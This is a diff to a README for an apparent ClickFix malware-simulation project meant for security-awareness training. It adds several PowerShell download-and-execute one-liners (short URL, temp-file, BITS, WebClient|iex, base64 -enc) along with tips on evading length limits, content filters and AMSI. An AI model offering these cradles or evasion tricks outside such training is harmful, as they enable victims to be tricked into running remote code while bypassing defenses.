@@ -47,11 +47,27 @@ The comprehensive malware simulation that demonstrates:
 
 # Usage examples that attackers might instruct victims to run:
 
-# Windows - Via Run Dialog (Win+R):
-powershell -ep bypass -c "iex (iwr 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1').Content"
+# Windows - Via Run Dialog (Win+R) - Short URL version:
+powershell -ep bypass -c "iex (iwr 'https://bit.ly/simalicious').Content"
+
+# Windows - Via Run Dialog (Win+R) - Two-step download method:
+powershell -ep bypass -c "iwr 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1' -UseBasicParsing -OutFile $("$($env:temp)/s.ps1")"; & $("$($env:TEMP)/s.ps1")
+
+# Windows - Via Run Dialog (Win+R) - Base64 encoded (bypasses some content filters):
+powershell -ep bypass -enc <base64_encoded_command>
 
 # Cross-platform - Via Terminal/Command Prompt (requires PowerShell):
 powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1' -UseBasicParsing).Content"
+
+# Alternative download methods (may bypass some protections):
+# Method 1: Download then execute from temp
+powershell -ep bypass -c "iwr 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1' -UseBasicParsing -OutFile $env:temp\script.ps1; & $env:temp\script.ps1"
+
+# Method 2: Using Start-BitsTransfer (alternative download method)
+powershell -ep bypass -c "Start-BitsTransfer 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1' $env:temp\s.ps1; & $env:temp\s.ps1"
+
+# Method 3: Using .NET WebClient (older method, sometimes bypasses modern filters)
+powershell -ep bypass -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1')|iex"
 
 ```
 ## 🚨 Common Attack Patterns Demonstrated
@@ -61,6 +77,25 @@ Attackers often instruct Windows victims to:
 1. Press `Windows + R` to open Run dialog
 2. Paste a malicious PowerShell command
 3. Press Enter to execute
+
+**Note**: Win+R has a ~260 character limit, so attackers use:
+- **Short URLs** (bit.ly, tinyurl) to bypass length limits
+- **Two-step methods** (download first, then execute)
+- **Base64 encoding** to obfuscate commands
+- **Alternative download methods** to bypass content filters
+
+### 2. Defender/AMSI Bypass Considerations
+For training campaigns, be aware that Windows Defender may still block even with hash allow lists because:
+- **In-memory execution** doesn't create files with calculable hashes
+- **AMSI scanning** occurs at runtime regardless of file hashes
+- **Behavioral analysis** flags suspicious PowerShell patterns
+- **URL reputation** may block known malicious domains
+
+**Training Environment Solutions**:
+- Use internal web servers instead of public GitHub
+- Configure group policy to allow PowerShell from trusted sources
+- Temporarily adjust AMSI settings in isolated training networks
+- Use signed scripts with trusted certificates
 
 ### 2. Linux/macOS ClickFix Pattern
 Attackers often instruct Linux/macOS victims to:
